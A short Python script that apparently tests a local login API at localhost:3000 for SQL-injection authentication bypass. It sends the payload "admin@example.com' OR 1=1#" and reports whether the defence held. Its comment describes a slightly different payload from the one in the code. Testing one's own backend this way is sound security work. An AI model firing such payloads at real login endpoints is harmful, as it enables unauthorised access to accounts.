#!/usr/bin/env python3
import requests
import sys

# Configuration
TARGET_URL = "http://localhost:3000/api/auth/login"
HEADERS = {"Content-Type": "application/json"}

print(f"[*] Starting SQL Injection (Authentication Bypass) Simulation against {TARGET_URL}")

# The classic SQLi payload
# This turns the query: SELECT * FROM users WHERE email = '$email' AND password_hash = '$password'
# Into: SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1' -- ' AND password_hash = 'anything'
# The -- comments out the rest of the query, and '1'='1' is always true, logging us in as the first matched user (usually admin).

target_email = "admin@example.com' OR 1=1#"
dummy_password = "doesnt_matter"

payload = {
    "email": target_email,
    "password": dummy_password
}

print(f"\n[!] Injecting Payload...")
print(f"[-] Email Field: {target_email}")
print(f"[-] Password Field: {dummy_password}")
print("-" * 50)

try:
    response = requests.post(TARGET_URL, json=payload, headers=HEADERS)
    
    if response.status_code == 200:
        print(f"\n[!] VULNERABILITY EXPLOITED! Authentication Bypassed!")
        print(f"[-] Server Response: {response.json()}")
        print("\n[*] The vulnerable backend executed the injected SQL statement.")
    else:
        print(f"\n[✓] DEFENSE SUCCESSFUL! Attack Blocked.")
        print(f"[-] Status Code: {response.status_code}")
        print(f"[-] Server Response: {response.text}")
        print("\n[*] The secure backend parameterized the query, treating the payload as a literal string.")
        
except requests.exceptions.ConnectionError:
    print("\n[!] Connection Error: Is the backend server running on port 3000?")
    sys.exit(1)
